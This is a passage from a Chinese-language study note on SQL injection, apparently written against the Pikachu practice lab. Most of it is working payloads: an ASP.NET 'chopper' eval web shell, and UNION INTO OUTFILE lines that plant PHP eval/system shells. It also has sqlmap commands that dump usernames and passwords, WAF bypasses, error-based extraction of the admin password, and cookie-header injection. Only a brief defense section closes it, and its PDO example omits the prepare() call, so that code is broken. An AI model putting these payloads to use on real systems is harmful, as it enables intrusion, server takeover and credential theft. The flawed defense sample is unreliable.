id="5ba8db55-6aee-838c-b2cf-81c4a5fcffaa" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">ASP.NET： &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</code></pre></div><div style="display:contents" dir="auto"><hr id="2f38db55-6aee-827d-8a59-81e8ed46fdaa"/></div><div style="display:contents" dir="auto"><pre id="a4c8db55-6aee-8234-b293-015035d0239c" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">获取系统权限操作：
+kobe&#x27; union select &quot;&lt;?php @eval($_GET[&#x27;test&#x27;])?&gt;&quot;, 2 into outfile &quot;/var/www/html/1.php&quot;#
+kobe&#x27; union select &quot;&lt;?php system($_GET[&#x27;cmd&#x27;])?&gt;&quot;, 2 into outfile &quot;/var/www/html/2.php&quot;#</code></pre></div><div style="display:contents" dir="auto"><h2 id="7c28db55-6aee-8319-9758-01434a962837" class="">SQL中的暴力破解</h2></div><div style="display:contents" dir="auto"><p id="17d8db55-6aee-8257-9473-81d8da553c87" class="">暴力破解表名，列名</p></div><div style="display:contents" dir="auto"><pre id="0d98db55-6aee-836a-b5de-812561a3c934" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">kobe&#x27; and exists(select * from aa)#
+kobe&#x27; and exists(select id from users)#</code></pre></div><div style="display:contents" dir="auto"><p id="bb28db55-6aee-8283-b222-817f692b00d4" class="">利用bp爆破表明，替换aa，（下图是识别排除错误的标识信息）</p></div><div style="display:contents" dir="ltr"><figure id="55e8db55-6aee-8263-bee5-81d20298a8f7" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/Snipaste_2025-08-20_14-35-07.png"><img style="width:863.4895629882812px" src="SQL%E6%B3%A8%E5%85%A5/Snipaste_2025-08-20_14-35-07.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="03c8db55-6aee-8252-a963-01003f4f0c29" class="">Sqlmap</h2></div><div style="display:contents" dir="auto"><p id="d928db55-6aee-836e-879d-01100bd8d933" class="">自带爆破md5哈希值</p></div><div style="display:contents" dir="auto"><pre id="b488db55-6aee-8392-b111-81def6dcdad3" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all"># 自动测试url下是否存在注入漏洞
+-u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=312&amp;submit=%E6%9F%A5%E8%AF%A2&quot;
+# --current-db 获取数据库名称
+-u &quot;http://127.0.0.1/pikachu/...&quot; --current-db
+# 遍历表名
+-u &quot;http://127.0.0.1/pikachu/...&quot; -D 库名称 --tables
+# 列名
+-u &quot;http://127.0.0.1/pikachu/...&quot; -D 库名称 -T 表明 --columns
+# 找内部数据
+-u &quot;http://127.0.0.1/pikachu/...&quot; -D 库名称 -T 表明 -C username, password --dump</code></pre></div><div style="display:contents" dir="auto"><h2 id="f598db55-6aee-8273-9076-013605fa94ac" class="">一些技巧</h2></div><div style="display:contents" dir="auto"><h3 id="92d8db55-6aee-829a-98ec-017c94c93cdc" class="">1、绕过WAF/过滤机制</h3></div><div style="display:contents" dir="auto"><p id="c4a8db55-6aee-82bc-b5dd-014b4711f7c7" class="">1、大小写混写</p></div><div style="display:contents" dir="auto"><pre id="07b8db55-6aee-823d-aac1-01e1dd05abad" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELeCT * FROM users WHERE id=1;</code></pre></div><div style="display:contents" dir="auto"><p id="1958db55-6aee-83c4-aeef-0190b57e8e41" class="">2、注释绕过</p></div><div style="display:contents" dir="auto"><pre id="08c8db55-6aee-8214-9b07-813b479db987" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">&#x27; or 1=1 /*!50000 #*/ -- - # mysql 5.0+特有注释</code></pre></div><div style="display:contents" dir="auto"><p id="f9c8db55-6aee-838a-84ee-81cd99cf3ec2" class="">3、编码转换</p></div><div style="display:contents" dir="auto"><pre id="9e78db55-6aee-825c-a361-01fc1a5b7881" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">0x27204f5220313d31202d2d20  # 十六进制编码的 &#x27; OR 1=1 -- </code></pre></div><div style="display:contents" dir="auto"><p id="3e28db55-6aee-8375-a805-81e9d63afa7c" class="">4、函数替代</p></div><div style="display:contents" dir="auto"><pre id="2f58db55-6aee-8308-bf65-812af2058b87" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">if(1=1, 1, 0) -&gt; case when 1=1 then 1 else 0 end</code></pre></div><div style="display:contents" dir="auto"><h3 id="c1f8db55-6aee-83d0-8e9e-01f5490d0cdd" class="">2、二次注入</h3></div><div style="display:contents" dir="auto"><p id="0e78db55-6aee-82a5-a6b3-01a947d5d115" class="">&gt;&gt;&gt; 将恶意SQL代码存入数据库（如评论，用户名），后续查询时触发</p></div><div style="display:contents" dir="auto"><p id="ea18db55-6aee-83da-80b4-815dddf15d36" class="">1、用户名注册时命名为：</p></div><div style="display:contents" dir="auto"><pre id="a168db55-6aee-83fa-bcd9-01b166f7e8fd" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">&#x27; OR 1=1 -- -</code></pre></div><div style="display:contents" dir="auto"><p id="cae8db55-6aee-83b4-aa6f-01e1ae3bcdce" class="">2、登录时验证执行</p></div><div style="display:contents" dir="auto"><pre id="0308db55-6aee-824d-9bed-01a6dac5d6ee" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">select * from users where username=&#x27;&#x27;; or 1=1 -- -&#x27; and password=&#x27;xxx&#x27;;</code></pre></div><div style="display:contents" dir="auto"><h3 id="2958db55-6aee-825c-8ac5-8157b95754fd" class="">3、基于错误日志的注入</h3></div><div style="display:contents" dir="auto"><p id="e7f8db55-6aee-822d-a57e-012376749844" class="">&gt;&gt;&gt; 李彤数据库错误日志记录敏感信息，再通过文件读取漏洞获得日志内容。</p></div><div style="display:contents" dir="auto"><p id="6e98db55-6aee-82d7-a0c4-815a9835b9ab" class="">1、触发包含敏感数据的错误：</p></div><div style="display:contents" dir="auto"><pre id="4f68db55-6aee-82f4-8838-013ee099259f" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">&#x27; and(select 1/0 from (select user())a) -- - # 错误日志会记录用户信息</code></pre></div><div style="display:contents" dir="auto"><p id="5478db55-6aee-822e-b7af-81629ba92568" class="">2、读取错误日志文件：</p></div><div style="display:contents" dir="auto"><pre id="e8d8db55-6aee-8342-8590-813907c4f392" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">&#x27; and load_file(&#x27;/var/log/mysql/error.log&#x27;) -- -</code></pre></div><div style="display:contents" dir="auto"><h3 id="5d28db55-6aee-8281-890a-019fc441abb1" class="">4、updatexml()</h3></div><div style="display:contents" dir="auto"><p id="0de8db55-6aee-82aa-9f72-019d8a9f88ab" class=""><code>UPDATEXML()</code> 是一个用于修改 XML 数据的函数，主要作用是更新 XML 文档中指定节点的值</p></div><div style="display:contents" dir="auto"><pre id="3ca8db55-6aee-82b3-ba7b-01868f6066e5" class="code code-wrap"><code class="language-markdown" style="white-space:pre-wrap;word-break:break-all">k&#x27; and updatexml(1, version(), 0)#
+~ ： 0x7e
+k&#x27; and updatexml(1, concat(0x7e, version()), 0)#
+k&#x27; and updatexml(1, concat(0x7e, database()), 0)#
+# 报错，只会显示一行
+k&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;)), 0)#
+# 使用limit一次一次进行获取表名
+k&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)), 0)#
+# 获取user字段
+k&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;user&#x27; limit 0,1)), 0)#
+
+# 获取列名后，再来获取其他数据
+k&#x27; and updatexml(1, concat(0x7e, (select username from users limit 0,1)), 0)#
+k&#x27; and updatexml(1, concat(0x7e, (select password from users where username=&#x27;admin&#x27; limit 0,1)), 0)#
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="6c08db55-6aee-83b1-9d1f-0181b909db82" class="">5、insert/update/delete 报错下的注入</h3></div><div style="display:contents" dir="auto"><p id="0d48db55-6aee-820b-8e8d-81e5664220e6" class="">一般这三个无法使用union</p></div><div style="display:contents" dir="auto"><p id="b728db55-6aee-8379-8368-8120932c4879" class="">insert下 一般在注册信息时候</p></div><div style="display:contents" dir="auto"><p id="a128db55-6aee-8268-ba07-811f592ecf72" class="">update下 一般在修改信息的时候</p></div><div style="display:contents" dir="auto"><pre id="70b8db55-6aee-82bb-9401-0147e9a953ee" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 利用or闭合，将database()换成想要的语句
+xiaoming&#x27; or updatexml(1, concat(0x7e, database()), 0) or &#x27; -- 最后的or &#x27; 用于闭合后面的&#x27;
+
+xiaoming&#x27; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&quot;pikachu&quot;)), 0) or &#x27;</code></pre></div><div style="display:contents" dir="auto"><p id="51e8db55-6aee-8371-a30e-016ee6d76e1c" class="">delete下 删除浏览，信息时候</p></div><div style="display:contents" dir="auto"><pre id="f4d8db55-6aee-8335-beb3-010613b3987e" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">1 or updatexml(1, concat(0x7e, database()), 0)</code></pre></div><div style="display:contents" dir="auto"><h3 id="f8a8db55-6aee-83ac-a298-01402809535c" class="">6、extractvalue()</h3></div><div style="display:contents" dir="auto"><p id="9aa8db55-6aee-8325-a794-01d3ee0097b9" class=""><code>extractvalue()</code> 是 SQL 中用于从 XML 数据中提取指定节点值的函数，广泛应用于支持 XML 类型的数据库。</p></div><div style="display:contents" dir="auto"><p id="5f78db55-6aee-8327-ab2e-81822046edac" class="">通过 XPath 表达式定位 XML 节点，并并返回，并返回节点的文本内容。</p></div><div style="display:contents" dir="auto"><pre id="ab88db55-6aee-8256-ba71-01789fbf1dea" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">kk&#x27; and extractvalue(0, concat(0x7e, version())) # </code></pre></div><div style="display:contents" dir="auto"><h3 id="7968db55-6aee-838d-b4ba-012b3a751e4f" class="">7、floor()</h3></div><div style="display:contents" dir="auto"><p id="ef88db55-6aee-83bd-9101-0181a9fcf761" class=""><code>floor()</code> 向下取整</p></div><div style="display:contents" dir="auto"><pre id="d7e8db55-6aee-8210-909e-01dd7365c945" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 必须要有count(*),rand(),group by三个
+-- version() 可以替换成需要的语句
+kk&#x27; and (select 2 from (select count(*), concat(version(), floor(rand(0)*2))x from information_schema.tables group by x)a)#
+kk&#x27; and (select 2 from (select count(*), concat((select password from users where username=&#x27;admin&#x27; limit 0,1), floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></pre></div><div style="display:contents" dir="auto"><h3 id="ea88db55-6aee-82be-a720-010a49131734" class="">8、http header</h3></div><div style="display:contents" dir="auto"><p id="a338db55-6aee-82da-8292-015b2960613b" class="">有时候需要验证，修改，查询等http header内容（存在sql数据库查询，匹配等sql操作），但没有考虑到安全防范，或不规范导致</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-jsx.min.js" integrity="sha512-m3JYEI6gx5fh9jF10FjGoMzVKcV2N6nchcDcqPCdI1L3R2WQV7br2XVNR8iTLb2daOMRl3zldbcfT40xU2ntVw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="0298db55-6aee-8230-8da4-81d3a5c5bed2" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">Cookie: ant[uname]=admin&#x27; and updatexml(1, concat(0x7e, database()), 0)#
+
+fi&#x27; or updatexml(1, concat(0x7e, database()), 0) or &#x27;</code></pre></div><div style="display:contents" dir="auto"><h2 id="28e8db55-6aee-8230-a563-81f71fcb53e1" class="">防御措施</h2></div><div style="display:contents" dir="auto"><h3 id="71f8db55-6aee-8233-a11c-813ca819f29a" class="">1、转义+过滤</h3></div><div style="display:contents" dir="auto"><p id="e888db55-6aee-82dc-ae26-01ca03ce85f5" class="">mysqli_real_escape_string($data);</p></div><div style="display:contents" dir="auto"><p id="b178db55-6aee-82af-afc3-81a9a8848aad" class="">str_replace()</p></div><div style="display:contents" dir="auto"><p id="8998db55-6aee-83a0-a170-0149411b4c13" class="">等替换，转义，过滤等，在输入方面</p></div><div style="display:contents" dir="auto"><p id="4ed8db55-6aee-82e7-871b-8151680bdcdb" class="">这个并不是很好，因为更新出新的东西后，可能就有问题了</p></div><div style="display:contents" dir="auto"><h3 id="c868db55-6aee-833e-a136-81f26aa1378a" class="">2、PDO的prepare预处理（预处理+参数化）(推荐)</h3></div><div style="display:contents" dir="auto"><pre id="ba08db55-6aee-8345-be38-81b6b7bc4b4d" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$username = $_GET[&#x27;username&#x27;];
+$password = $_GET[&#x27;password&#x27;];
+try {
+	$pdo = new PDO(&#x27;mysql:host=localhost;dbname=ant&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);
+	$sql = &quot;select * from admin where username=? and password=?&quot;;
+	// var_dump($stmt)
+	$stmt-&gt;execute(array($username, $password));
+	// 这个时候再把参数传进去，以索引数组的方式传进去，而不是拼接，就防止了注入
+} catch (PDOException $e) {
+	echo $e-&gt;getMessage();
+}</code></pre></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
